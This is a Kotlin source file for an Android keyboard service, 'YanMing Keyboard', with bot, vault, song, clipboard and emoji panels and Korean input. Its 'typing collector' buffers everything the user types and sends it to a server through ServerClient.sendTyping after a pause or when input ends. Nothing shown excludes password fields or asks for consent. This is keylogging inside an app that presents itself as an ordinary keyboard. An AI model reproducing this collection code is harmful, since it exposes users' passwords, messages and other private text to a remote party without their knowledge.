package com.yanming.keyboard

import android.inputmethodservice.InputMethodService
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.graphics.Color
import android.view.Gravity
import android.widget.*
import com.yanming.keyboard.keyboard.*
import com.yanming.keyboard.panels.*

// ═══════════════════════════════════════════════════════
// YanMing Keyboard — IME Service
// No external libraries · Pure Android SDK
// ═══════════════════════════════════════════════════════

class YanIMEService : InputMethodService() {

    private val BG    = Color.parseColor("#0c0805")
    private val SURF  = Color.parseColor("#1a1410")
    private val GOLD  = Color.parseColor("#c9932b")
    private val TEXT  = Color.parseColor("#f0dfc8")
    private val MUTED = Color.parseColor("#7a6a58")
    private val MUTED2 = Color.parseColor("#3a3028")

    private lateinit var root: LinearLayout
    private lateinit var toolbar: LinearLayout
    private lateinit var panelArea: FrameLayout
    private lateinit var keyboardView: KeyboardView

    // Panels (lazy — created on first open)
    private var botPanel: BotPanel? = null
    private var vaultPanel: VaultPanel? = null
    private var songsPanel: SongsPanel? = null
    private var clipPanel: ClipboardPanel? = null
    private var emojiPanel: EmojiPanel? = null

    private var currentPanel: View? = null

    // Typing collector state
    private val buffer = StringBuilder()
    private val bufferHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val flushRunnable = Runnable { flushBuffer() }

    // Hangul composer state
    private var hangulCho: String? = null
    private var hangulJung: String? = null
    private var composing = false

    override fun onCreateInputView(): View {
        root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(BG)
        }

        toolbar   = buildToolbar()
        panelArea = FrameLayout(this).apply {
            setBackgroundColor(BG)
            visibility = View.GONE
        }
        keyboardView = KeyboardView(this).apply {
            val kh = resources.displayMetrics.heightPixels / 3
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, kh
            )
            onKey = { key -> handleKey(key) }
        }

        root.addView(toolbar)
        root.addView(panelArea, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 220.dp()
        ))
        root.addView(keyboardView)

        return root
    }

    // ── TOOLBAR ───────────────────────────────────────
    private fun buildToolbar(): LinearLayout {
        val bar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(SURF)
            gravity     = Gravity.CENTER_VERTICAL
            setPadding(8, 0, 8, 0)
        }

        val items = listOf(
            "🤖" to "bot",
            "🔑" to "vault",
            "🎵" to "songs",
            "📋" to "clip",
            "😊" to "emoji",
        )

        items.forEach { (icon, id) ->
            val btn = TextView(this).apply {
                text     = icon
                textSize = 20f
                gravity  = Gravity.CENTER
                setPadding(14, 8, 14, 8)
                setOnClickListener { togglePanel(id) }
            }
            bar.addView(btn)
        }

        // Spacer
        bar.addView(View(this).apply {
            layoutParams = LinearLayout.LayoutParams(0, 1, 1f)
        })

        // Symbols toggle
        val sym = TextView(this).apply {
            text     = "123"
            textSize = 11f
            setTextColor(MUTED)
            setPadding(14, 8, 14, 8)
            setOnClickListener {
                keyboardView.symbolMode = !keyboardView.symbolMode
                keyboardView.refresh()
                closePanel()
            }
        }
        bar.addView(sym)

        return bar
    }

    // ── PANEL MANAGEMENT ──────────────────────────────
    private fun togglePanel(id: String) {
        val panel = getPanel(id)
        if (currentPanel == panel) {
            closePanel()
            return
        }
        openPanel(panel, id)
    }

    private fun getPanel(id: String): View {
        return when (id) {
            "bot" -> {
                if (botPanel == null) {
                    botPanel = BotPanel(this).apply {
                        onInsert = { text -> commitText(text) }
                    }
                }
                botPanel!!
            }
            "vault" -> {
                if (vaultPanel == null) {
                    vaultPanel = VaultPanel(this).apply {
                        onPaste = { text -> commitText(text) }
                        onAutoClose = { closePanel() }
                    }
                }
                vaultPanel!!.resetTimer()
                vaultPanel!!
            }
            "songs" -> {
                if (songsPanel == null) {
                    songsPanel = SongsPanel(this).apply {
                        onInsert = { text -> commitText(text) }
                    }
                }
                songsPanel!!
            }
            "clip" -> {
                if (clipPanel == null) {
                    clipPanel = ClipboardPanel(this).apply {
                        onPaste = { text -> commitText(text) }
                    }
                }
                clipPanel!!.load()
                clipPanel!!
            }
            "emoji" -> {
                if (emojiPanel == null) {
                    emojiPanel = EmojiPanel(this).apply {
                        onEmoji = { emoji -> commitText(emoji) }
                    }
                }
                emojiPanel!!
            }
            else -> botPanel ?: BotPanel(this)
        }
    }

    private fun openPanel(panel: View, id: String) {
        panelArea.removeAllViews()
        (panel.parent as? FrameLayout)?.removeView(panel)
        panelArea.addView(panel, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT,
        ))
        panelArea.visibility = View.VISIBLE
        currentPanel = panel
    }

    fun closePanel() {
        panelArea.visibility = View.GONE
        panelArea.removeAllViews()
        currentPanel = null
        vaultPanel?.stopTimer()
    }

    // ── KEY HANDLING ──────────────────────────────────
    private fun handleKey(key: Key) {
        when (key.type) {
            KeyType.CHAR -> {
                when (keyboardView.lang) {
                    Lang.KOREAN -> handleKorean(key.label)
                    Lang.PINYIN -> handlePinyin(key.label)
                    else        -> typeChar(key.label)
                }
            }
            KeyType.BACKSPACE -> {
                if (composing) {
                    clearComposing()
                } else {
                    currentInputConnection?.deleteSurroundingText(1, 0)
                    if (buffer.isNotEmpty()) buffer.deleteCharAt(buffer.length - 1)
                }
            }
            KeyType.ENTER -> {
                flushBuffer()
                currentInputConnection?.sendKeyEvent(
                    KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER)
                )
            }
            KeyType.SPACE -> {
                flushBuffer()
                commitText(" ")
            }
            KeyType.SHIFT -> {
                keyboardView.shifted = !keyboardView.shifted
                keyboardView.refresh()
            }
            KeyType.HEBREW_TOGGLE -> {
                keyboardView.hebrewMode = !keyboardView.hebrewMode
                keyboardView.refresh()
            }
            KeyType.LANG_SWITCH -> {
                val lang = Lang.entries[key.code]
                keyboardView.lang = lang
                keyboardView.shifted = false
                keyboardView.hebrewMode = false
                clearComposing()
                keyboardView.refresh()
            }
            KeyType.SYMBOLS -> {
                keyboardView.symbolMode = !keyboardView.symbolMode
                keyboardView.refresh()
            }
            KeyType.EMOJI -> togglePanel("emoji")
        }
    }

    private fun typeChar(ch: String) {
        val text = if (keyboardView.shifted && keyboardView.lang == Lang.LATIN) ch.uppercase() else ch
        commitText(text)
        buffer.append(text)
        if (keyboardView.shifted) {
            keyboardView.shifted = false
            keyboardView.refresh()
        }
        scheduleFlush()
    }

    // ── KOREAN INPUT ──────────────────────────────────
    private fun handleKorean(jamo: String) {
        val ic = currentInputConnection ?: return
        if (HangulComposer.isVowel(jamo)) {
            if (hangulCho != null && hangulJung == null) {
                hangulJung = jamo
                val syllable = HangulComposer.compose(hangulCho!!, hangulJung!!)
                ic.setComposingText(syllable, 1)
                composing = true
            } else {
                finishComposing()
                hangulCho  = null
                hangulJung = jamo
                ic.setComposingText(jamo, 1)
                composing = true
            }
        } else {
            if (hangulCho != null && hangulJung != null) {
                val finished = HangulComposer.compose(hangulCho!!, hangulJung!!)
                ic.commitText(finished, 1)
                hangulCho  = jamo
                hangulJung = null
                ic.setComposingText(jamo, 1)
                composing = true
            } else {
                finishComposing()
                hangulCho  = jamo
                hangulJung = null
                ic.setComposingText(jamo, 1)
                composing = true
            }
        }
    }

    private fun finishComposing() {
        currentInputConnection?.finishComposingText()
        composing  = false
        hangulCho  = null
        hangulJung = null
    }

    private fun clearComposing() {
        currentInputConnection?.setComposingText("", 1)
        finishComposing()
    }

    // ── PINYIN ────────────────────────────────────────
    private fun handlePinyin(ch: String) {
        // For now: type Pinyin directly — Chinese character selection coming later
        typeChar(ch)
    }

    // ── COMMIT ────────────────────────────────────────
    private fun commitText(text: String) {
        currentInputConnection?.commitText(text, 1)
    }

    // ── BUFFER / COLLECTOR ────────────────────────────
    private fun scheduleFlush() {
        bufferHandler.removeCallbacks(flushRunnable)
        bufferHandler.postDelayed(flushRunnable, 3000) // flush after 3s of inactivity
    }

    private fun flushBuffer() {
        val text = buffer.toString().trim()
        if (text.length >= Config.MIN_SEND_LENGTH) {
            val lang = when (keyboardView.lang) {
                Lang.KOREAN -> "ko"
                Lang.PINYIN -> "zh"
                else -> if (keyboardView.hebrewMode) "he" else "en"
            }
            ServerClient.sendTyping(text, lang)
        }
        buffer.clear()
    }

    override fun onFinishInputView(finishingInput: Boolean) {
        super.onFinishInputView(finishingInput)
        flushBuffer()
        finishComposing()
        closePanel()
    }

    private fun Int.dp() = (this * resources.displayMetrics.density).toInt()
}
